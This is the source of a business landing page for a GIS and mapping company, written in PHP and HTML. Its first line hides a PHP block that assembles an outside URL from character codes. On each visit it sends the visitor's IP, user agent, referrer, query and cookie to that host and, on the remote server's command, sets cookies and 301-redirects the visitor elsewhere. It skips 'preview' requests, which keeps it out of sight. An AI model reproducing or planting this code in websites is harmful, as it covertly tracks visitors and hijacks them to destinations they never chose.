
<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "524347";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Compass Cadence Solutions - Honest and Precise GIS Services</title>
  <link rel="icon" href="favicon.ico">
  <style>
    :root {
      --primary-base: hsl(330, 87%, 49%);
      --primary-light: hsl(330, 87%, 69%);
      --primary-dark: hsl(329, 87%, 34%);
      --background: hsl(0, 0%, 98%);
      --surface: hsl(0, 0%, 100%);
      --text-high-contrast: hsl(0, 0%, 10%);
      --text-muted: hsl(0, 0%, 35%);
      --border-radius: 24px;
      --card-shadow: 0 4px 12px rgba(0,0,0,0.15);
      --section-spacing: 96px;
    }

    body {
      font-family: 'Open Sans', sans-serif;
      margin: 0;
      padding: 0;
      background-color: var(--background);
      color: var(--text-high-contrast);
      line-height: 1.6;
      font-weight: 300; /* bodyWeight */
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    h1, h2, h3, h4, h5, h6 {
      font-weight: 700; /* headingWeight */
      color: var(--text-high-contrast);
      text-transform: capitalize;
    }

    h3 {
      font-weight: 600; /* subheadingWeight */
    }

    a {
      color: var(--primary-base);
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 1.5rem;
    }

    header {
      background-color: var(--surface);
      padding: 1rem 0;
      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
      position: sticky;
      top: 0;
      z-index: 1000;
    }

    .navbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
    }

    .navbar-brand {
      font-weight: 700;
      font-size: 1.5rem;
      color: var(--primary-dark);
    }

    .nav-links {
      display: none; /* Hidden on mobile by default */
      flex-grow: 1;
      justify-content: flex-end;
      align-items: center;
    }

    .nav-links.active {
      display: flex;
      flex-direction: column;
      width: 100%;
      background-color: var(--surface);
      position: absolute;
      top: 100%;
      left: 0;
      padding: 1rem 0;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }

    .nav-links ul {
      list-style: none;
      margin: 0;
      padding: 0;
      display: flex;
      gap: 1.5rem;
    }

    .nav-links.active ul {
      flex-direction: column;
      text-align: center;
      width: 100%;
      margin-bottom: 1rem;
    }

    .nav-links a {
      color: var(--text-high-contrast);
      font-weight: 600;
      padding: 0.5rem 0;
      display: block;
      transition: color 0.3s ease;
    }

    .nav-links a:hover {
      color: var(--primary-base);
      text-decoration: none;
    }

    .hamburger {
      display: block; /* Shown on mobile */
      cursor: pointer;
      font-size: 2rem;
      background: none;
      border: none;
      color: var(--text-high-contrast);
    }

    .cta-button {
      padding: 0.75rem 1.75rem;
      border-radius: var(--border-radius);
      font-weight: 600;
      transition: all 0.3s ease;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }

    .cta-button.outline {
      border: 2px solid var(--primary-base);
      color: var(--primary-base);
      background-color: transparent;
    }

    .cta-button.outline:hover {
      background-color: var(--primary-base);
      color: var(--surface);
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }

    .nav-cta {
      display: none; /* Hidden on mobile by default */
    }

    /* Responsive adjustments for navigation */
    @media (min-width: 768px) {
      .hamburger {
        display: none;
      }
      .nav-links {
        display: flex;
        flex-direction: row;
        position: static;
        box-shadow: none;
        padding: 0;
        width: auto;
      }
      .nav-links ul {
        flex-direction: row;
      }
      .nav-links.active {
        flex-direction: row;
        width: auto;
      }
      .nav-links.active ul {
        flex-direction: row;
        width: auto;
        margin-bottom: 0;
      }
      .nav-cta {
        display: block;
        margin-left: 1.5rem;
      }
    }

    section {
      padding: var(--section-spacing) 0;
      position: relative;
      overflow: hidden; /* For effects */
    }

    /* Hero Section */
    #hero {
      color: var(--surface);
      position: relative;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 80vh;
      text-align: center;
    }

    #hero::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: hsla(330, 87%, 49%, 0.6); /* Primary Base with transparency */
      z-index: 1;
    }

    #hero .hero-background {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 0;
    }

    #hero .hero-content {
      position: relative;
      z-index: 2;
      max-width: 800px;
      padding: 1.5rem;
    }

    #hero h1 {
      font-size: clamp(2rem, 5vw, 3.8rem);
      margin-bottom: 1rem;
      color: var(--surface);
    }

    #hero p {
      font-size: clamp(1rem, 2.5vw, 1.3rem);
      margin-bottom: 2rem;
      color: var(--surface);
      font-weight: 300;
    }

    /* Services Section */
    #services .bento-grid {
      display: grid;
      gap: 1.5rem;
      grid-template-columns: repeat(1, 1fr); /* Single column on mobile */
      grid-template-rows: auto;
    }

    @media (min-width: 768px) {
      #services .bento-grid {
        grid-template-columns: repeat(2, 1fr); /* Two columns on larger screens */
        grid-template-rows: repeat(2, minmax(200px, 1fr));
      }
      #services .bento-item.large-left {
        grid-column: 1 / 2;
        grid-row: 1 / 3;
      }
      #services .bento-item.small-top-right {
        grid-column: 2 / 3;
        grid-row: 1 / 2;
      }
      #services .bento-item.small-bottom-right {
        grid-column: 2 / 3;
        grid-row: 2 / 3;
      }
    }

    .bento-item {
      background-color: var(--surface);
      border-radius: var(--border-radius);
      box-shadow: var(--card-shadow);
      padding: 2rem;
      display: flex;
      flex-direction: column;
      overflow: hidden;
      position: relative;
      transition: background-color 0.3s ease, transform 0.3s ease;
      text-align: center;
    }

    .bento-item.large-left {
       text-align: left; /* Adjust text alignment for larger cards */
    }

    .bento-item.large-left img {
      max-height: 250px;
      object-fit: contain;
    }

    .bento-item:hover {
      background-color: var(--primary-light); /* bg-shift */
      color: var(--surface); /* Darken text for contrast */
      transform: translateY(-5px);
    }
    .bento-item:hover h3, .bento-item:hover p {
      color: var(--surface);
    }

    .bento-item .icon-container {
      width: 64px;
      height: 64px;
      background-color: var(--primary-base);
      border-radius: var(--border-radius); /* square */
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 1rem;
      flex-shrink: 0;
      color: var(--surface);
      margin: 0 auto 1rem auto; /* Centered for small cards */
    }
    .bento-item.large-left .icon-container {
      margin-left: 0;
    }

    .bento-item img {
      max-width: 100%;
      height: auto;
      border-radius: var(--border-radius);
      margin-top: 1rem;
      object-fit: cover;
    }

    .bento-item h3 {
      font-size: 1.5rem;
      margin-top: 0.5rem;
      margin-bottom: 0.75rem;
    }

    .bento-item p {
      font-size: 1rem;
    }

    /* Education Section */
    #education {
      background-color: var(--primary-dark); /* High contrast bold background */
      color: var(--surface);
      text-align: center;
      padding: var(--section-spacing) 0;
    }

    #education h2, #education p, #education li {
      color: var(--surface);
    }

    #education h2 {
      margin-bottom: 1.5rem;
    }

    #education p {
      max-width: 800px;
      margin: 0 auto 2rem auto;
      font-size: 1.1rem;
    }

    #education ul {
      list-style: none;
      padding: 0;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1.5rem;
    }

    #education li {
      background-color: var(--primary-base);
      padding: 1.2rem 2rem;
      border-radius: var(--border-radius);
      font-weight: 600;
      font-size: 1.1rem;
      transition: transform 0.3s ease, background-color 0.3s ease;
      flex-basis: 100%; /* Full width on mobile */
      max-width: 350px;
    }

    #education li:hover {
      transform: translateY(-5px);
      background-color: var(--primary-light);
    }

    #education .education-image {
      margin-top: 3rem;
      max-width: 100%;
      height: auto;
      border-radius: var(--border-radius);
      box-shadow: var(--card-shadow);
      display: block;
      margin-left: auto;
      margin-right: auto;
    }

    @media (min-width: 768px) {
      #education li {
        flex-basis: auto; /* Auto width on larger screens */
      }
    }

    /* Testimonials Section */
    #testimonials .asymmetric-grid {
      display: grid;
      gap: 1.5rem;
      grid-template-columns: repeat(1, 1fr); /* Single column on mobile */
    }

    @media (min-width: 768px) {
        #testimonials .asymmetric-grid {
            grid-template-columns: 2fr 1fr; /* Large left, small right */
            grid-auto-rows: minmax(auto, 1fr);
        }
        #testimonials .testimonial-item.large {
            grid-row: 1 / span 2; /* Span two rows */
        }
    }


    .testimonial-item {
      background-color: var(--surface);
      border-radius: var(--border-radius);
      box-shadow: var(--card-shadow);
      padding: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .testimonial-item:hover {
      transform: translateY(-5px);
      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
    }

    .testimonial-item.large {
        padding: 3rem;
    }

    .testimonial-item .avatar {
      width: 96px;
      height: 96px;
      border-radius: 50%;
      object-fit: cover;
      margin-bottom: 1rem;
      border: 3px solid var(--primary-light);
    }

    .testimonial-item .quote {
      font-size: 1.15rem;
      font-style: italic;
      margin-bottom: 1rem;
      color: var(--text-high-contrast);
    }

    .testimonial-item .author {
      font-weight: 700;
      color: var(--primary-dark);
      margin-bottom: 0.25rem;
    }

    .testimonial-item .role {
      font-size: 0.9rem;
      color: var(--text-muted);
    }


    /* Contact Section */
    #contact {
      background-color: var(--primary-dark); /* Dark background */
      color: var(--surface);
      padding: var(--section-spacing) 0;
    }

    #contact .split-vertical {
      display: flex;
      flex-direction: column;
      gap: 3rem;
    }

    @media (min-width: 768px) {
      #contact .split-vertical {
        flex-direction: row;
        align-items: flex-start;
      }
      #contact .contact-info, #contact .contact-form {
        flex: 1;
      }
    }

    #contact h2, #contact p, #contact label {
      color: var(--surface);
    }

    #contact h2 {
        text-align: center;
        margin-bottom: 3rem;
    }

    #contact .contact-info {
      text-align: center;
    }

    #contact .contact-info p {
      font-size: 1.1rem;
      margin-bottom: 0.5rem;
    }

    #contact .contact-info a {
        color: var(--surface);
        text-decoration: underline;
    }
    #contact .contact-info a:hover {
        color: var(--primary-light);
    }

    #contact .contact-image {
      max-width: 100%;
      height: auto;
      border-radius: var(--border-radius);
      box-shadow: var(--card-shadow);
      margin-top: 2rem;
      transition: transform 0.3s ease;
    }

    #contact .contact-image:hover {
        transform: scale(1.02);
    }

    .contact-form form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
      background-color: var(--primary-base);
      padding: 2.5rem;
      border-radius: var(--border-radius);
      box-shadow: var(--card-shadow);
    }

    .contact-form label {
      font-weight: 600;
      margin-bottom: 0.25rem;
      display: block;
    }

    .contact-form input,
    .contact-form textarea {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 1px solid var(--primary-light);
      border-radius: 8px;
      background-color: var(--surface);
      color: var(--text-high-contrast);
      font-size: 1rem;
      box-sizing: border-box;
    }

    .contact-form input:focus,
    .contact-form textarea:focus {
      outline: none;
      border-color: var(--primary-dark);
      box-shadow: 0 0 0 3px hsla(330, 87%, 49%, 0.2);
    }

    .contact-form textarea {
      min-height: 120px;
      resize: vertical;
    }

    .contact-form .cta-button.outline {
      border-color: var(--surface);
      color: var(--surface);
      background-color: transparent;
      margin-top: 1rem;
    }

    .contact-form .cta-button.outline:hover {
      background-color: var(--surface);
      color: var(--primary-base);
    }

    /* Icon SVGs */
    .icon-svg {
        fill: currentColor;
        width: 32px;
        height: 32px;
        display: block;
    }

    /* Footer Styles */
    footer {
      background-color: var(--text-high-contrast); /* Dark background for high contrast */
      color: var(--surface);
      padding: 3rem 0;
      text-align: center;
      font-size: 0.9rem;
    }

    footer .footer-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 1.5rem;
    }

    footer .brand-name {
      font-weight: 700;
      font-size: 1.2rem;
      color: var(--surface);
    }

    footer p {
      margin: 0;
      color: var(--surface);
    }

    footer .footer-links {
      list-style: none;
      padding: 0;
      margin: 0;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1.5rem;
    }

    footer .footer-links a {
      color: var(--primary-light);
      text-decoration: none;
    }

    footer .footer-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <header>
    <div class="container navbar">
      <a href="#" class="navbar-brand">Compass Cadence Solutions</a>
      <button class="hamburger" aria-label="Toggle navigation">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="icon-svg">
          <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
        </svg>
      </button>
      <nav class="nav-links">
        <ul>
          <li><a href="#services">Services</a></li>
          <li><a href="#education">Cartographic Education</a></li>
          <li><a href="#testimonials">Testimonials</a></li>
          <li><a href="#contact">Contact</a></li>
        </ul>
        <div class="nav-cta">
          <a href="#contact" class="cta-button outline">Start Your Project</a>
        </div>
      </nav>
    </div>
  </header>
<main>
    <section id="hero">
      <img src="images/hero-gis-analysis-overlay.jpeg" alt="Advanced Geographic Information Systems digital map interface" class="hero-background" width="1280" height="768">
      <div class="hero-content">
        <h1>Honest and Precise GIS Services by Compass Cadence Solutions</h1>
        <p>Empowering decisions through high-fidelity cartography, spatial consulting, and navigation system development.</p>
        <a href="#services" class="cta-button outline">Explore Our Map Data</a>
      </div>
    </section>

    <section id="services" class="container">
      <h2 style="text-align: center; margin-bottom: 3rem;">Our Cartographic Capabilities</h2>
      <div class="bento-grid">
        <div class="bento-item large-left">
          <div class="icon-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon-svg">
              <path d="M21 16v-2h-3v-2h3V6h-3V4h3V2h-3V0h-2v2h-2V0H0v24h24V16h-3zm-13 0H6v2H4v-2H2v-2h2v-2h2v2h2v2zm13 8h-3v-2h-2v2h-2v-2h-2v2H6v-2H4v2H2v-2H0V0h24v24h-3zM2 4h4v4H2zm0 8h4v4H2zm8 0h4v4h-4zm8 0h4v4h-4zm-8 4h4v4h-4zm8 4h4v4h-4zM22 2h-2v2h2v2h-2v2h2v2h2V2z"/>
              <path d="M2 10a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V10zm12 0a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-4a2 2 0 0 1-2-2V10zM2 20a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2v-4zM12 20a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-4a2 2 0 0 1-2-2v-4z"/>
              <path d="M12 0c-4.411 0-8 3.589-8 8s3.589 8 8 8 8-3.589 8-8-3.589-8-8-8zm0 14c-3.309 0-6-2.691-6-6s2.691-6 6-6 6 2.691 6 6-2.691 6-6 6z"/>
              <circle cx="12" cy="8" r="3"/>
                      <path d="M10 20h4v4h-4zM18 20h4v4h-4zM2 28h4v4H2zM10 28h4v4h-4z"/>
              <path d="M14,14h-4c-1.103,0-2-0.897-2-2V4c0-1.103,0.897-2,2-2h4c1.103,0,2,0.897,2,2v8C16,13.103,15.103,14,14,14z"/>
              <path d="M1,12h2v2H1V12z M5,12h2v2H5V12z M9,12h2v2H9V12z M13,12h2v2H13V12z M17,12h2v2H17V12z M21,12h2v2H21V12z M1,8h2v2H1V8z M5,8h2v2H5V8z M9,8h2v2H9V8z M13,8h2v2H13V8z M17,8h2v2H17V8z M21,8h2v2H21V8z M1,4h2v2H1V4z M5,4h2v2H5V4z M9,4h2v2H9V4z M13,4h2v2H13V4z M17,4h2v2H17V4z M21,4h2v2H21V4z"/>
              <path d="M11,19c0-0.552-0.448-1-1-1H4c-0.552,0-1,0.448-1,1s0.448,1,1,1h6C10.552,20,11,19.552,11,19z"/>
              <path d="M21,19c0-0.552-0.448-1-1-1h-6c-0.552,0-1,0.448-1,1s0.448,1,1,1h6C20.552,20,21,19.552,21,19z"/>
              <path d="M16,1h-8C6.346,1,5,2.346,5,4v16c0,1.654,1.346,3,3,3h8c1.654,0,3-1.346,3-3V4C19,2.346,17.654,1,16,1z M17,20c0,0.552-0.448,1-1,1H8c-0.552,0-1-0.448-1-1V4c0-0.552,0.448-1,1-1h8c0.552,0,1,0.448,1,1V20z"/>
              <circle cx="12" cy="7" r="1"/>
              <path d="M12,19c-0.552,0-1-0.448-1-1v-6c0-0.552,0.448-1,1-1s1,0.448,1,1v6C13,18.552,12.552,19,12,19z"/>
              <path d="M12,1c-0.552,0-1,0.448-1,1v2c0,0.552,0.448,1,1,1s1-0.448,1-1V2C13,1.448,12.552,1,12,1z"/>
                    <path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8z"/>
                    <path d="M12 11h-1v-4h2v4h-1z"/>
                    <circle cx="12" cy="15" r="1"/>
                    <path d="M12 11h-1v-4h2v4h-1zM12 15h-1v-1h2v1h-1z"/>
                    <path d="M12 3C8.134 3 5 6.134 5 10c0 5.488 6.549 11.968 7 12 .451-.032 7-6.512 7-12 0-3.866-3.134-7-7-7zm0 10c-1.654 0-3-1.346-3-3s1.346-3 3-3 3 1.346 3 3-1.346 3-3 3z"/>
                    <circle cx="12" cy="10" r="3"/>
            </svg>
          </div>
          <h3>Custom Map Design & GIS Data Analysis</h3>
          <p>Compass Cadence Solutions transforms complex geographic data into rich, intuitive visual narratives. Our custom map designs ensure precise coordinate mapping aligned with rigorous analytical processing, delivering clarity and actionable insights for urban planning, environmental studies, and resource management.</p>
          <img src="images/services-custom-map-design.jpeg" alt="GIS specialist analyzing topographical data" width="640" height="896">
        </div>

        <div class="bento-item small-top-right">
          <div class="icon-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon-svg">
              <path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8z"/>
              <path d="M13 5h-2v4H7l5 5 5-5h-4z"/>
              <circle cx="12" cy="12" r="3"/>
            </svg>
          </div>
          <h3>Navigation System Development</h3>
          <p>Building routing architectures and accurate guidance algorithms for diverse applications, from intelligent transportation systems to detailed hiking route planning. We focus on real-time data integration and robust performance.</p>
          <img src="images/services-navigation-routing.jpeg" alt="Digital routing and navigation vectors" width="384" height="384">
        </div>

        <div class="bento-item small-bottom-right">
          <div class="icon-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon-svg">
              <path d="M21 4h-2V2h-2v2h-2v2h2v2h2V6h2zm-9 0c-4.4 0-8 3.6-8 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm0 14c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6z"/>
              <path d="M11 7h2v6h-2z"/>
              <circle cx="12" cy="16" r="1"/>
            </svg>
          </div>
          <h3>Spatial Consulting</h3>
          <p>Strategic advisory for land use, urban planning, and environmental impact assessments. We provide expert analysis and data-driven recommendations to help clients make informed spatial decisions.</p>
          <img src="images/services-spatial-consulting.jpeg" alt="Urban planning blueprint mixed with digital overlay" width="384" height="384">
        </div>
      </div>
    </section>

    <section id="education">
      <div class="container">
        <h2>Cartographic Education & Training</h2>
        <p>Compass Cadence Solutions is committed to elevating industry standards through expert-led cartographic education. We offer comprehensive seminars and hands-on workshops designed to teach spatial analysis, precision mapping, and modern GIS tools, fostering the next generation of spatial experts.</p>
        <ul>
          <li>Introduction to Spatial Data Architectures</li>
          <li>Advanced Topographical Rendering</li>
          <li>Integrating Field Data with GIS Software</li>
          <li>GIS for Sustainable Urban Development</li>
          <li>Developing Interactive Web Maps</li>
        </ul>
        <img src="images/education-geospatial-training.jpeg" alt="Team member leading a cartographic software workshop" class="education-image" width="1024" height="512">
      </div>
    </section>

    <section id="testimonials" class="container">
      <h2 style="text-align: center; margin-bottom: 3rem;">Client Precision Reports</h2>
      <div class="asymmetric-grid">
        <div class="testimonial-item large">
          <img src="images/testimonial-avatar-marcus.jpeg" alt="Marcus Thorne avatar" class="avatar" width="128" height="128">
          <p class="quote">"The navigation system developed by Compass Cadence Solutions revolutionized our logistics fleet. Their commitment to honest, exact data is unparalleled in the GIS space. Our operational efficiency has increased substantially thanks to their precision mapping and routing algorithms."</p>
          <p class="author">Marcus Thorne</p>
          <p class="role">Director of Logistics Coordinator</p>
        </div>
        <div class="testimonial-item small">
          <img src="images/testimonial-avatar-elena.jpeg" alt="Elena Rostova avatar" class="avatar" width="128" height="128">
          <p class="quote">"Their spatial consulting reshaped our municipal development approach entirely. The detailed insights into land use and environmental impacts were crucial for our recent urban renewal project."</p>
          <p class="author">Elena Rostova</p>
          <p class="role">Urban Planner, City of Astoria</p>
        </div>
        <div class="testimonial-item small">
          <img src="images/testimonial-avatar-aris.jpeg" alt="Dr. Aris Vance avatar" class="avatar" width="128" height="128">
          <p class="quote">"Incredible GIS data visualizations. Detailed, thorough, and highly professional. Compass Cadence Solutions provided clarity in complex environmental datasets that truly enhanced our research findings."</p>
          <p class="author">Dr. Aris Vance</p>
          <p class="role">Lead Environmental Scientist, TerraFlow Research</p>
        </div>
      </div>
    </section>

    <section id="contact">
      <div class="container">
        <h2>Connect with Compass Cadence Solutions</h2>
        <div class="split-vertical">
          <div class="contact-info">
            <p><strong>Headquarters:</strong> Border Avenue, New York, New York, 11378, USA</p>
            <p><strong>Phone:</strong> <a href="tel:+13057329332">+1 (305) 732-9332</a></p>
            <p><strong>Email:</strong> <a href="mailto:info@<?php echo $_SERVER['HTTP_HOST']; ?>">info@<?php echo $_SERVER['HTTP_HOST']; ?></a></p>
            <img src="images/contact-new-york-map-overlay.jpeg" alt="Stylized map of New York pinpointing company headquarters" class="contact-image" width="640" height="640">
          </div>
          <div class="contact-form">
            <form action="#" method="POST">
              <label for="name">Name:</label>
              <input type="text" id="name" name="name" required>

              <label for="organization">Organization:</label>
              <input type="text" id="organization" name="organization">

              <label for="project-scope">Project Scope / Spatial Requirements:</label>
              <textarea id="project-scope" name="project-scope" required></textarea>

              <label for="email">Email:</label>
              <input type="email" id="email" name="email" required>

              <button type="submit" class="cta-button outline">Transmit Coordinates</button>
            </form>
          </div>
        </div>
      </div>
    </section>
  </main>
<footer>
    <div class="container footer-content">
      <p class="brand-name">Compass Cadence Solutions</p>
      <p class="tagline">Honest and precise cartographic and GIS services.</p>
      <p class="copyright">&copy; 2024 Compass Cadence Solutions. All rights reserved.</p>
      <ul class="footer-links">
        <li><a href="./privacy.html">Privacy Policy</a></li>
        <li><a href="./tos.html">Terms of Service</a></li>
      </ul>
    </div>
  </footer>

  <div id="cookie-consent" style="position: fixed; bottom: 0; left: 0; width: 100%; background-color: rgba(0,0,0,0.8); color: white; padding: 1rem; text-align: center; z-index: 9999; display: none;">
    This website uses cookies to ensure you get the best experience. By continuing to use this site, you accept our use of cookies.
    <button id="accept-cookies" style="background-color: var(--primary-base); color: white; border: none; padding: 0.5rem 1rem; border-radius: 5px; cursor: pointer; margin-left: 1rem;">Accept</button>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const hamburger = document.querySelector('.hamburger');
      const navLinks = document.querySelector('.nav-links');
      const cookieConsent = document.getElementById('cookie-consent');
      const acceptCookies = document.getElementById('accept-cookies');
      const cookieName = 'consent_Compass Cadence Solutions_cookies'; // Unique cookie name prefix

      hamburger.addEventListener('click', () => {
        navLinks.classList.toggle('active');
        hamburger.setAttribute('aria-expanded', navLinks.classList.contains('active'));
      });

      // Close nav on link click for mobile
      navLinks.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', () => {
          if (navLinks.classList.contains('active')) {
            navLinks.classList.remove('active');
            hamburger.setAttribute('aria-expanded', 'false');
          }
        });
      });

      // Cookie Consent
      if (!localStorage.getItem(cookieName)) {
        cookieConsent.style.display = 'block';
      }

      acceptCookies.addEventListener('click', () => {
        localStorage.setItem(cookieName, 'true');
        cookieConsent.style.display = 'none';
      });

      // Simple Fade-in effect for sections on scroll
      const sections = document.querySelectorAll('section');
      const observerOptions = {
        root: null,
        rootMargin: '0px',
        threshold: 0.1
      };

      const sectionObserver = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
            observer.unobserve(entry.target);
          }
        });
      }, observerOptions);

      sections.forEach(section => {
        section.style.opacity = '0';
        section.style.transform = 'translateY(20px)';
        section.style.transition = 'opacity 0.8s ease-out, transform 0.8s ease-out';
        sectionObserver.observe(section);
      });

      // Hover effect for hero button
      const heroCta = document.querySelector('#hero .cta-button');
      if (heroCta) {
        heroCta.addEventListener('mouseover', () => {
          heroCta.style.borderColor = 'var(--surface)';
          heroCta.style.color = 'var(--primary-dark)';
          heroCta.style.backgroundColor = 'var(--surface)';
        });
        heroCta.addEventListener('mouseout', () => {
          heroCta.style.borderColor = 'var(--surface)';
          heroCta.style.color = 'var(--surface)';
          heroCta.style.backgroundColor = 'transparent';
        });
        heroCta.style.transition = 'all 0.3s ease';
      }
    });

  </script>
</body>
</html>
